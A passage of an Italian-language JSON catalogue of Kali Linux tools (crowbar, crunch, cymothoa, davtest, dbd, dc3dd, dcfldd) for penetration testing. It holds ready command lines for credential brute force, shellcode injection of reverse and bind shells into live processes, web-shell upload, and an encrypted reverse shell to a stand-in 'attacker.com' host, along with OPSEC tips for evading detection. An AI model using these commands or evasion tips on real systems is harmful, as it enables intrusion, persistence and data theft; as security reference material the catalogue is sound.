lista utenti e password\ncrowbar -b rdp -s 10.0.0.0/24 -U users.txt -C passwords.txt -n 2\n\n# Attacco OpenVPN con file di configurazione\ncrowbar -b openvpn -s 192.168.1.10/32 -c client.ovpn -u admin -C pass.txt\n\n# Brute force VNC\ncrowbar -b vnckey -s 192.168.1.0/24 -k /path/to/keys/ -p 5900</code></pre><p>Il parametro -n limita il numero di thread paralleli, utile per evitare lockout degli account o sovraccarico del servizio target. Per attacchi SSH con chiavi, assicurarsi che le chiavi siano nel formato corretto (PEM) e con permessi appropriati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In operazioni di <strong>Post-Exploitation e Lateral Movement</strong>, quando si trovano chiavi SSH private su un sistema compromesso (nelle home directory degli utenti, in file di configurazione o in repository git), Crowbar permette di testare rapidamente queste chiavi contro tutti gli host raggiungibili nella rete per espandere l'accesso. Per il <strong>Penetration Testing di Ambienti Windows</strong>, il supporto RDP con NLA rende Crowbar lo strumento necessario per verificare la robustezza delle password degli account che espongono Remote Desktop, specialmente in ambienti dove Hydra fallirebbe. In scenari di <strong>VPN Security Assessment</strong>, quando si ottengono file di configurazione OpenVPN durante il penetration testing (da share di rete, email o documentazione interna), Crowbar permette di testare credenziali per verificare l'accesso alla rete aziendale tramite VPN.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Come ogni strumento di brute force, Crowbar genera un elevato numero di tentativi di autenticazione falliti che sono facilmente rilevabili dai sistemi di monitoraggio. I tentativi RDP sono registrati nel Windows Event Log (Event ID 4625), i tentativi SSH in auth.log/secure, e i tentativi VPN nei log del server OpenVPN. Sistemi fail2ban o lockout policy possono bloccare l'IP attaccante o gli account target.</p><p><strong>Impatto operativo:</strong> Il brute force puo causare il lockout degli account testati se sono configurate policy di lockout dopo un numero di tentativi falliti. Questo puo avere impatto sull'operativita degli utenti legittimi e rivelare l'attacco. Per RDP, tentative eccessive possono anche causare rallentamenti del servizio Terminal Services.</p><p><strong>Mitigazioni:</strong> Limitare il numero di thread (-n 1 o -n 2) e introdurre delay tra i tentativi per rimanere sotto le soglie di lockout. Verificare preventivamente le policy di lockout dell'ambiente target. Per SSH con chiavi, il testing e generalmente piu silenzioso perche ogni tentativo con chiave valida ha successo al primo colpo. Utilizzare username validi ottenuti da enumerazione precedente per ridurre il numero totale di tentativi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "crunch",
    "name": "crunch",
    "version": "3.6",
    "icon": "../app/icons/crunch-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/crunch/",
    "desc": "Genera wordlist con pattern, charset e lunghezze personalizzabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Crunch</strong> è un generatore di wordlist altamente configurabile che crea combinazioni di caratteri basate su pattern, charset e lunghezza specificati. A differenza di tool che usano wordlist esistenti, Crunch genera tutte le possibili combinazioni, permettendo attacchi brute force esaustivi o targetizzati con pattern conosciuti (es. password che iniziano con lettere e finiscono con numeri).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Length Range:</strong> Genera parole da una lunghezza minima a massima specificata.</p><p><strong>Charset Control:</strong> Usa charset predefiniti (alpha, numeric, symbols) o completamente personalizzati.</p><p><strong>Pattern Mode:</strong> Specifica pattern con placeholder (@ per lowercase, , per uppercase, % per numeri, ^ per simboli).</p><p><strong>Streaming:</strong> Può fare pipe diretto a tool di cracking senza salvare su disco (risparmio spazio).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Pattern corporate: Nome + Anno + Simbolo\ncrunch 10 12 -t @@@@@@20%%^  # es: Summer2024!\n\n# WiFi: 8 cifre numeriche (PIN WPS o password)\ncrunch 8 8 0123456789 | aircrack-ng -w - capture.cap\n\n# Pipe diretta a hashcat (no file intermedio)\ncrunch 8 8 -t @@@@%%%% | hashcat -m 1000 hashes.txt\n\n# Charset ridotto basato su policy aziendale\ncrunch 8 12 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#' -o policy_wordlist.txt\n\n# Pattern con parola fissa + variazioni\ncrunch 10 10 -t Company%%^^ -o company_variations.txt\n\n# Limita output file per dimensione (split)\ncrunch 6 6 -b 100mb -o START passwords.txt\n\n# Combina con regole esterne\ncrunch 4 4 0123456789 | hashcat --stdout -r best64.rule &gt; mutations.txt\n\n# Resume da checkpoint\ncrunch 8 8 -s startword -e endword</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Targeted Attacks</strong> quando si conosce parzialmente la struttura della password (es. iniziali del nome + anno). In <strong>CTF</strong>, genera tutte le combinazioni di un charset limitato.</p><p>Per <strong>Policy Testing</strong>, verifica che password rispettino requisiti minimi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Dimensioni:</strong> Wordlist esaustive possono essere enormi (terabyte). Usare pattern o pipe streaming per limitare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Generators"
    ],
    "notes": null
  },
  {
    "id": "cymothoa",
    "name": "cymothoa",
    "version": "1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cymothoa/",
    "desc": "Inietta shellcode in processi Linux attivi per backdoor in-memory.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Cymothoa</strong> e uno strumento di stealth backdooring per sistemi Linux che permette di iniettare shellcode direttamente nella memoria di processi gia in esecuzione, senza creare nuovi processi, file su disco o altre tracce persistenti nel filesystem. Il nome deriva dal Cymothoa exigua, un parassita che sostituisce la lingua dei pesci, riflettendo la natura parassitica dello strumento che si innesta in processi legittimi. Cymothoa utilizza la system call ptrace per attaccarsi a un processo target, iniettare il payload nella sua area di memoria e dirottare il flusso di esecuzione. Lo strumento include diversi payload predefiniti ottimizzati per diverse architetture, tra cui reverse shell, bind shell e payload personalizzati, tutti progettati per coesistere con il processo ospite senza causarne il crash.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Process Injection tramite ptrace:</strong> Cymothoa sfrutta la system call ptrace di Linux per attaccarsi a un processo in esecuzione, sovrascrivere una porzione di memoria con lo shellcode e modificare il registro di istruzione (EIP/RIP) per eseguire il payload iniettato. L'injection e progettata per preservare lo stato del processo originale, permettendo al processo ospite di continuare a funzionare normalmente mentre il payload opera in parallelo.</p><p><strong>Payload Predefiniti Multipli:</strong> Lo strumento include una libreria di payload precompilati per diverse finalita operative: reverse shell TCP per connessioni verso l'attaccante, bind shell per aprire porte in ascolto, e payload specializzati per scenari specifici. Ogni payload e ottimizzato per essere il piu compatto possibile e minimizzare l'impatto sul processo ospite.</p><p><strong>Operazione Completamente Fileless:</strong> A differenza di backdoor tradizionali che richiedono file su disco (binari, script, cron job), Cymothoa opera interamente in memoria RAM. Non crea file, non modifica file esistenti e non aggiunge entry di autostart. L'unica traccia e la presenza dello shellcode nella memoria del processo target, che scompare quando il processo viene terminato o il sistema riavviato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Cymothoa richiede privilegi di root (o capability CAP_SYS_PTRACE) per utilizzare ptrace su processi di altri utenti. Il processo target deve essere scelto con attenzione per massimizzare la persistenza e la discrezione.</p><pre><code># Visualizzare la lista dei payload disponibili\ncymothoa -S\n\n# Iniettare una reverse shell (payload 1) in un processo\ncymothoa -p 1234 -s 1 -y 4444\n\n# Iniettare un payload con IP e porta dell'attaccante\ncymothoa -p 1234 -s 0 -y 4444 -x 10.0.0.1\n\n# Iniettare una bind shell (payload 2) su una porta specifica\ncymothoa -p 1234 -s 2 -y 5555\n\n# Scegliere un processo target stabile (es. sshd, apache2)\nps aux | grep -E 'sshd|apache2|nginx'\ncymothoa -p $(pidof sshd) -s 1 -y 4444</code></pre><p>E fondamentale scegliere processi stabili e di lunga durata come target di injection. Demoni come sshd, apache2, nginx o systemd sono candidati ideali perche rimangono attivi per tutta la durata dell'uptime del sistema, massimizzando la persistenza della backdoor.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In operazioni di <strong>Red Team e Post-Exploitation</strong>, Cymothoa permette di stabilire persistenza fileless su sistemi Linux compromessi, evitando i meccanismi di detection basati su scansione del filesystem come antivirus e file integrity monitoring (AIDE, OSSEC, Tripwire). La backdoor sopravvive finche il processo ospite e attivo. Per <strong>Evasione di Controlli di Sicurezza</strong>, in ambienti con filesystem read-only, mount noexec o strict file integrity monitoring, Cymothoa offre un metodo di persistenza che opera interamente in memoria senza necessita di scrivere file eseguibili su disco. In scenari di <strong>Persistence su Infrastruttura Critica</strong>, iniettando il payload in demoni di sistema che vengono riavviati automaticamente (tramite systemd o init), la backdoor puo sopravvivere anche ai riavvii del servizio, a patto che il PID venga aggiornato dopo il restart.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di ptrace genera eventi monitorabili tramite auditd e sistemi di security monitoring Linux. Tool di memory forensics come Volatility possono identificare anomalie nella memoria dei processi iniettati. Il processo target potrebbe mostrare comportamenti anomali (connessioni di rete inattese, uso CPU elevato) rilevabili da sistemi di monitoring.</p><p><strong>Impatto operativo:</strong> L'injection puo causare instabilita o crash del processo target se lo shellcode non e compatibile con l'architettura o lo stato corrente del processo. Un crash di un demone critico (sshd, apache) e altamente visibile e puo generare alert immediati. La backdoor non sopravvive al riavvio del sistema a meno che il processo target non venga riavviato automaticamente.</p><p><strong>Mitigazioni:</strong> Testare l'injection su processi non critici prima di procedere con target di produzione. Disabilitare Yama LSM (se possibile) o utilizzare processi di proprieta dell'utente corrente per evitare problemi con le restrizioni ptrace. Monitorare la stabilita del processo dopo l'injection. Mantenere un accesso alternativo al sistema nel caso il processo target crashi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "davtest",
    "name": "davtest",
    "version": "1.2",
    "icon": "../app/icons/davtest-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/davtest/",
    "desc": "Testa server WebDAV per upload di file e verificare esecuzione codice.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DAVTest</strong> e uno strumento automatizzato per il security testing di server WebDAV (Web Distributed Authoring and Versioning), progettato per identificare se un server WebDAV mal configurato permette l'upload e l'esecuzione di file potenzialmente malevoli. Lo strumento testa sistematicamente l'upload di file con diverse estensioni (asp, aspx, cfm, cgi, html, jhtml, jsp, php, pl, shtml, txt) e verifica se il server li accetta e, soprattutto, se li esegue come script lato server. DAVTest implementa anche il testing della funzionalita MOVE del protocollo WebDAV, che permette di rinominare file gia caricati con estensioni innocue in estensioni eseguibili, bypassando potenziali filtri sull'upload. Questo tipo di misconfiguration e particolarmente comune su server IIS con WebDAV abilitato e rappresenta un vettore di compromissione classico nel penetration testing.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Upload Testing Sistematico:</strong> DAVTest prova a caricare file di test con tutte le principali estensioni di scripting server-side su server WebDAV. Per ogni estensione, crea un file con contenuto specifico che, se eseguito, produce un output riconoscibile. Lo strumento registra quali estensioni vengono accettate dall'upload e quali vengono rifiutate, mappando la superficie di attacco disponibile sul server target.</p><p><strong>Execution Verification:</strong> Dopo l'upload di ciascun file di test, DAVTest tenta di accedervi via HTTP per verificare se il server web lo esegue come script o lo serve come contenuto statico. Questa distinzione e cruciale: un server potrebbe accettare l'upload di file .php ma servirli come testo senza eseguirli, nel qual caso non c'e una vulnerabilita di esecuzione remota di codice sfruttabile.</p><p><strong>MOVE Method Testing:</strong> Lo strumento testa se il metodo MOVE del protocollo WebDAV puo essere utilizzato per rinominare file. Questo permette di uploadare un file con estensione innocua (es. .txt) e poi rinominarlo in un'estensione eseguibile (es. .asp), bypassando filtri che bloccano l'upload diretto di estensioni pericolose. Questa tecnica e uno dei bypass piu efficaci contro filtri di upload basati su estensione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DAVTest richiede solo l'URL della directory WebDAV come input minimo. Se il server richiede autenticazione, le credenziali possono essere specificate. Lo strumento pulisce automaticamente i file di test dopo l'esecuzione.</p><pre><code># Test base di un server WebDAV\ndavtest -url http://target.com/webdav/\n\n# Test con credenziali di autenticazione\ndavtest -url http://target.com/webdav/ -auth username:password\n\n# Upload di un file specifico (es. web shell)\ndavtest -url http://target.com/webdav/ -uploadfile shell.aspx -uploadloc shell.aspx\n\n# Test senza pulizia dei file caricati\ndavtest -url http://target.com/webdav/ -cleanup no\n\n# Test con MOVE method abilitato\ndavtest -url http://target.com/webdav/ -move</code></pre><p>Dopo aver identificato le estensioni accettate e eseguibili, si puo procedere con l'upload manuale di una web shell appropriata usando cadaver o curl con i metodi WebDAV PUT e MOVE.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Quando strumenti di scansione come <strong>Nmap (script http-webdav-scan) o Nikto</strong> identificano WebDAV abilitato su un server web, DAVTest e il passo successivo naturale per determinare se la configurazione e sfruttabile. Automatizza la fase di reconnaissance che altrimenti richiederebbe test manuali con curl o cadaver. Per l'<strong>Exploitation di Server IIS</strong>, WebDAV mal configurato e una vulnerabilita classica e ricorrente, specialmente su versioni legacy di IIS. DAVTest permette di identificare rapidamente se il server accetta e esegue file ASP/ASPX, aprendo la strada a web shell per l'accesso remoto. In attivita di <strong>Compliance e Hardening Verification</strong>, DAVTest puo essere utilizzato per verificare che le configurazioni di sicurezza di WebDAV siano corrette dopo un hardening, confermando che le estensioni pericolose sono effettivamente bloccate sia nell'upload che nell'esecuzione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I file di test vengono uploadati e accessati tramite HTTP, generando entry nei log del server web (access log e WebDAV log). I nomi dei file di test contengono pattern riconoscibili (prefisso \"DavTestDir\" e \"davtest\") che possono essere identificati da sistemi di monitoraggio. I WAF possono bloccare i tentativi di upload di estensioni pericolose.</p><p><strong>Impatto operativo:</strong> Anche con la pulizia automatica, tracce possono rimanere nei log del server, nella cache del proxy o in sistemi di backup. L'upload di file eseguibili puo triggerare alert da parte di antivirus o sistemi di endpoint protection installati sul server. In ambienti monitorati, i metodi HTTP PUT e MOVE sono considerati anomali e possono generare alert.</p><p><strong>Mitigazioni:</strong> Utilizzare l'opzione di cleanup per rimuovere automaticamente i file di test dopo la verifica. Se possibile, eseguire il test in finestre di manutenzione concordate. Utilizzare nomi di file meno riconoscibili con l'opzione -uploadfile per test mirati. Verificare i log dopo il test per comprendere quale traccia e stata lasciata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "dbd",
    "name": "dbd",
    "version": "1.50",
    "icon": "../app/icons/dbd-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dbd/",
    "desc": "Clone di netcat con crittografia AES e feature di evasione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DBD</strong> (Durandal's Backdoor) e un clone avanzato di netcat specificamente progettato per operazioni offensive e red team, con l'aggiunta cruciale della crittografia AES-CBC-128 su tutto il traffico di rete. Mentre netcat trasmette dati in chiaro, rendendo ogni comunicazione facilmente analizzabile da sistemi IDS/IPS e network monitoring, DBD cifra automaticamente tutto il traffico utilizzando una chiave condivisa (shared secret) configurabile, rendendo il contenuto della comunicazione opaco all'ispezione di rete. Lo strumento mantiene tutte le funzionalita classiche di netcat (bind shell, reverse shell, trasferimento file, port forwarding) aggiungendo opzioni operative come il respawning automatico della connessione in caso di disconnessione, il detach dal terminale per operazione in background, e modalita quiet per ridurre il footprint. DBD e compilato staticamente e disponibile per Linux e Windows, rendendolo uno strumento versatile per operazioni cross-platform.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Crittografia AES-CBC-128 Integrata:</strong> Tutto il traffico tra client e server DBD e automaticamente cifrato con AES-CBC-128 utilizzando una chiave condivisa specificata con il parametro -k. Questo impedisce ai sistemi di network monitoring, IDS/IPS e deep packet inspection di analizzare il contenuto delle comunicazioni, inclusi comandi shell, output e file trasferiti. La crittografia e trasparente per l'utente e non richiede configurazione aggiuntiva oltre alla shared key.</p><p><strong>Respawn Automatico della Shell:</strong> Con l'opzione -r, DBD riavvia automaticamente il listener o la shell se la connessione viene interrotta. Questa funzionalita e fondamentale per mantenere la persistenza dell'accesso in scenari dove le connessioni possono essere instabili o dove il client si disconnette periodicamente. Il respawn avviene silenziosamente senza intervento manuale.</p><p><strong>Modalita Stealth e Detach:</strong> DBD supporta il detach dal terminale per eseguire in background come processo daemon, la modalita quiet che sopprime output non essenziale, e la possibilita di specificare un nome processo personalizzato per mimetizzarsi nella lista dei processi. Queste opzioni combinate rendono DBD significativamente piu discreto di netcat per operazioni prolungate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'utilizzo di DBD e volutamente simile a netcat per ridurre la curva di apprendimento. La differenza principale e il parametro -k per la chiave di crittografia, che deve essere identica su entrambi i lati della connessione.</p><pre><code># Listener con crittografia e bind shell\ndbd -l -p 4444 -e /bin/bash -k mysecretkey\n\n# Connessione client al listener\ndbd target.com 4444 -k mysecretkey\n\n# Reverse shell con respawn automatico\ndbd -l -p 4444 -k mykey -r\n# Sul target: dbd attacker.com 4444 -e /bin/sh -k mykey\n\n# Listener in background (daemon mode) con respawn\ndbd -l -p 4444 -e /bin/bash -k secretkey -r -D\n\n# Trasferimento file cifrato\n# Receiver: dbd -l -p 4444 -k filekey > received_file\n# Sender: dbd target.com 4444 -k filekey < secret_file</code></pre><p>La chiave di crittografia deve essere concordata preventivamente tra attaccante e target. Una chiave compromessa invalida completamente la protezione crittografica. Utilizzare chiavi lunghe e complesse per resistere ad attacchi di brute force sulla chiave stessa.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reverse e Bind Shell Cifrate</strong>, DBD e la scelta naturale quando si opera in ambienti con network monitoring attivo dove il traffico netcat in chiaro verrebbe immediatamente rilevato e bloccato. La crittografia AES rende il payload opaco all'ispezione, permettendo l'esecuzione di comandi e l'esfiltrazione di dati senza che il contenuto sia visibile ai difensori. In operazioni di <strong>Red Team prolungate</strong>, la combinazione di crittografia, respawn automatico e modalita daemon rende DBD uno strumento affidabile per mantenere accesso persistente attraverso canali cifrati che resistono a riavvii della connessione e periodi di inattivita. Per il <strong>Trasferimento Sicuro di File</strong> in scenari dove strumenti come SCP o SFTP non sono disponibili, DBD puo essere utilizzato come alternativa cifrata a netcat per spostare file sensibili (credenziali, database dump, tool aggiuntivi) tra sistemi compromessi senza esporre il contenuto sulla rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene il contenuto sia cifrato, il traffico DBD presenta pattern riconoscibili: flussi TCP persistenti con payload cifrato non riconducibile a protocolli noti (non e TLS/SSL) possono essere flaggati come anomali da sistemi di anomaly detection. Il traffico cifrato non-standard su porte non convenzionali e un indicatore di compromissione comune monitorato dai SOC.</p><p><strong>Impatto operativo:</strong> La connessione persistente verso l'IP dell'attaccante e visibile nelle tabelle di connessione (netstat, ss) e nei log del firewall. Il processo DBD appare nella lista processi e, se non rinominato, il nome del binario puo essere riconosciuto. La chiave di crittografia condivisa e un single point of failure: se compromessa, tutto il traffico intercettato puo essere decrittato retroattivamente.</p><p><strong>Mitigazioni:</strong> Utilizzare porte comunemente associate a servizi legittimi (443, 8080, 53) per ridurre la visibilita del traffico. Rinominare il binario DBD con nomi di processi di sistema comuni. Ruotare periodicamente la chiave di crittografia. Combinare con tecniche di port forwarding o tunneling per offuscare ulteriormente la destinazione del traffico. Considerare l'uso di TLS-based tool come socat con SSL per traffico che si mimetizza meglio nel traffico legittimo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "dc3dd",
    "name": "dc3dd",
    "version": "7.3.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dc3dd/",
    "desc": "Versione forense di dd con hashing on-the-fly, progress bar e split.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DC3DD</strong> e una versione potenziata del comando Unix dd sviluppata dal Department of Defense Cyber Crime Center (DC3) specificamente per operazioni di acquisizione forense digitale. Lo strumento estende le funzionalita base di dd con caratteristiche essenziali per le indagini giudiziarie: hashing crittografico on-the-fly per la verifica dell'integrita delle evidenze, indicatore di progresso in tempo reale, split automatico dell'output in file di dimensioni configurabili, logging dettagliato di tutte le operazioni e wiping sicuro dei supporti. DC3DD e diventato uno standard de facto nelle forze dell'ordine e nei laboratori forensi perche garantisce che l'acquisizione di evidenze digitali sia forensicamente valida, documentata e verificabile, requisiti fondamentali per l'ammissibilita in tribunale. Lo strumento supporta tutti i device block di Linux e puo operare su dischi interi, partizioni singole e immagini raw.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Hashing Crittografico On-the-fly:</strong> DC3DD calcola hash crittografici (MD5, SHA-1, SHA-256, SHA-512) simultaneamente durante il processo di copia, senza richiedere un passaggio separato di verifica. Questo garantisce che l'hash rappresenti esattamente i dati copiati e non un'immagine potenzialmente alterata successivamente. Il supporto per hash multipli simultanei (es. MD5 e SHA-256 insieme) soddisfa requisiti di diverse giurisdizioni e standard forensi.</p><p><strong>Split Automatico dell'Output:</strong> Lo strumento divide automaticamente l'immagine di output in file di dimensioni specificate (es. 2GB, 4.7GB per DVD), utile per limitazioni del filesystem FAT32 (massimo 4GB per file), per la distribuzione su supporti rimovibili o per conformita con procedure che richiedono la segmentazione delle evidenze. I segmenti sono numerati sequenzialmente e l'hash copre l'intero dataset indipendentemente dalla segmentazione.</p><p><strong>Logging Forense Dettagliato:</strong> DC3DD genera log completi che documentano ogni aspetto dell'operazione di acquisizione: timestamp di inizio e fine, dispositivo sorgente e destinazione, parametri utilizzati, dimensione totale dei dati copiati, hash calcolati e eventuali errori incontrati. Questo log e fondamentale per la documentazione della catena di custodia e per la riproducibilita dell'acquisizione in contesto giudiziario.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DC3DD si utilizza con una sintassi simile a dd ma con parametri aggiuntivi specifici per le operazioni forensi. E fondamentale utilizzare un write blocker hardware quando si acquisisce da supporti originali per prevenire qualsiasi scrittura accidentale sull'evidenza.</p><pre><code># Acquisizione forense completa con hash multipli e log\ndc3dd if=/dev/sda of=evidence.img hash=md5 hash=sha256 log=acquisition.log\n\n# Acquisizione con split in file da 2GB per compatibilita FAT32\ndc3dd if=/dev/sda of=evidence.img.000 ofsz=2G hash=md5 hash=sha256 log=acq.log\n\n# Acquisizione con verifica progressiva\ndc3dd if=/dev/sda of=evidence.img hash=sha256 log=acq.log hlog=hash.log\n\n# Wiping sicuro di un supporto con pattern\ndc3dd wipe=/dev/sdb pat=00 hash=sha256 log=wipe.log\n\n# Verifica integrita di un'immagine gia acquisita\ndc3dd if=evidence.img hash=sha256 log=verify.log of=/dev/null</code></pre><p>Il parametro hlog salva gli hash in un file separato per facilita di verifica. L'operazione di wiping e irreversibile e deve essere eseguita solo su supporti destinati allo smaltimento o alla riassegnazione. Verificare sempre il dispositivo target prima di procedere con dd o dc3dd per evitare sovrascritture accidentali.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>DC3DD e lo standard per le <strong>Acquisizioni Forensi in Contesto Giudiziario</strong> dove la catena di custodia e l'integrita delle evidenze devono essere dimostrabili in tribunale. L'hashing on-the-fly e il logging dettagliato forniscono la documentazione necessaria per attestare che l'immagine forense e una copia fedele bit-per-bit del supporto originale. In operazioni di <strong>Incident Response</strong>, quando si deve acquisire rapidamente un disco da un sistema compromesso preservando le evidenze, DC3DD offre il bilanciamento ideale tra velocita di acquisizione e garanzie forensi, con il vantaggio della progress bar per stimare i tempi in situazioni time-sensitive. Per il <strong>Secure Media Sanitization</strong>, la funzione di wiping con verifica hash garantisce che i supporti siano stati completamente sovrascritti prima dello smaltimento o della riassegnazione, soddisfacendo requisiti di compliance come NIST SP 800-88 per la sanitizzazione dei media.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'acquisizione forense di un disco genera I/O intensivo che puo essere rilevato da sistemi di monitoring delle performance. Su sistemi live, il processo di copia puo causare rallentamenti percepibili dagli utenti. L'accesso a device block raw (/dev/sda) richiede privilegi elevati e puo generare alert in sistemi di audit.</p><p><strong>Impatto operativo:</strong> L'acquisizione di dischi di grandi dimensioni (TB) richiede tempo significativo e spazio di storage equivalente sulla destinazione. Errori durante l'acquisizione (settori danneggiati, disconnessione) possono invalidare l'intera immagine se non gestiti correttamente. La mancanza di write blocker durante l'acquisizione puo compromettere l'ammissibilita dell'evidenza in tribunale.</p><p><strong>Mitigazioni:</strong> Utilizzare sempre write blocker hardware quando si acquisisce da supporti originali in contesto forense. Verificare lo spazio disponibile sulla destinazione prima di iniziare l'acquisizione. Eseguire una seconda acquisizione indipendente per cross-verifica degli hash. Documentare fotograficamente il setup di acquisizione incluso il write blocker. In caso di incident response su sistema live, considerare l'acquisizione della RAM prima del disco per preservare evidenze volatili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "dcfldd",
    "name": "dcfldd",
    "version": "1.9.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dcfldd/",
    "desc": "Enhanced dd per forensics con hash multipli, progress e split output.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DCFLDD</strong> e un fork avanzato di GNU dd sviluppato dal Department of Defense Computer Forensics Lab (DCFL) degli Stati Uniti, progettato specificamente per operazioni di acquisizione forense digitale. Lo strumento estende le capacita di dd aggiungendo funzionalita critiche per il lavoro forense: hashing on-the-fly con algoritmi multipli simultanei, status output in tempo reale durante le operazioni di copia, verifica tramite pattern matching, split dell'output in segmenti di dimensione configurabile e la capacita di scrivere contemporaneamente su destinazioni multiple. DCFLDD e ampiamente utilizzato nella community forense internazionale e rappresenta uno standard de facto per le acquisizioni disco. La sua stabilita e maturita lo rendono affidabile per operazioni critiche in contesti giudiziari dove l'integrita dei dati e fondamentale.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Hashing on-the-fly con algoritmi multipli:</strong> DCFLDD calcola gli hash durante il processo di copia senza richiedere una seconda passata sul disco. Supporta simultaneamente MD5, SHA-1, SHA-256, SHA-384 e SHA-512, permettendo di generare tutti i digest necessari in un'unica operazione. I log degli hash possono essere salvati in file separati per la catena di custodia, con hash parziali calcolati per ogni segmento di dimensione configurabile.</p><p><strong>Output multipli simultanei:</strong> Una delle funzionalita piu distintive di DCFLDD e la capacita di scrivere su piu destinazioni contemporaneamente durante una singola operazione di lettura. Questo permette di creare due o piu copie forensi identiche in parallelo, risparmiando tempo e garantendo che tutte le copie siano identiche bit-per-bit senza necessita di ulteriori verifiche.</p><p><strong>Split output e gestione segmenti:</strong> DCFLDD puo suddividere l'output in file di dimensione configurabile, utile quando si lavora con filesystem che hanno limiti sulla dimensione dei file (es. FAT32 con limite di 4GB). Ogni segmento riceve un suffisso numerico progressivo e viene hashato individualmente per verifica granulare.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DCFLDD viene utilizzato principalmente da riga di comando con una sintassi simile a dd ma con opzioni aggiuntive per le funzionalita forensi. Le operazioni tipiche includono acquisizione di interi dischi o partizioni con verifica hash simultanea.</p><pre><code># Acquisizione forense con hash multipli e log separato\ndcfldd if=/dev/sda of=evidence.dd hash=md5,sha256 hashlog=hashes.txt hashwindow=1G\n\n# Creazione di due copie forensi simultanee con verifica\ndcfldd if=/dev/sda of=copy1.dd of=copy2.dd hash=md5,sha256 hashlog=audit.log\n\n# Split output in segmenti da 2GB con hash per segmento\ndcfldd if=/dev/sda of=evidence.dd hash=sha256 hashlog=hash.log split=2G splitformat=000\n\n# Verifica wipe con pattern zero\ndcfldd if=/dev/sda vf=/dev/zero verifylog=wipe_verify.log\n\n# Confronto tra sorgente e copia\ndcfldd if=/dev/sda vf=evidence.dd verifylog=verify.log</code></pre><p>Il parametro <code>hashwindow</code> definisce la dimensione dei blocchi per cui vengono calcolati hash parziali, utile per identificare esattamente quale porzione del disco presenta differenze in caso di mismatch.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In ambito <strong>Digital Forensics</strong>, DCFLDD e lo strumento ideale quando si devono creare multiple copie forensi simultanee durante un sequestro: una copia per l'autorita giudiziaria, una per la difesa e una per il laboratorio di analisi, tutte generate in un'unica passata con hash di verifica. Per operazioni di <strong>Data Sanitization</strong> con verifica, garantisce che il wipe sia completo confrontando l'intero disco con un pattern noto. Nei contesti di <strong>Incident Response</strong>, la velocita dell'output multiplo riduce significativamente i tempi di acquisizione quando il tempo e critico e bisogna preservare le evidenze prima che vengano alterate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'operazione di lettura sequenziale dell'intero disco genera un pattern I/O facilmente identificabile. Su sistemi live, il processo dcfldd e visibile nella lista dei processi e il carico I/O sostenuto puo essere rilevato da soluzioni di monitoring.</p><p><strong>Impatto operativo:</strong> La lettura sequenziale di un intero disco consuma tutta la banda I/O disponibile, causando rallentamenti significativi su sistemi in produzione. 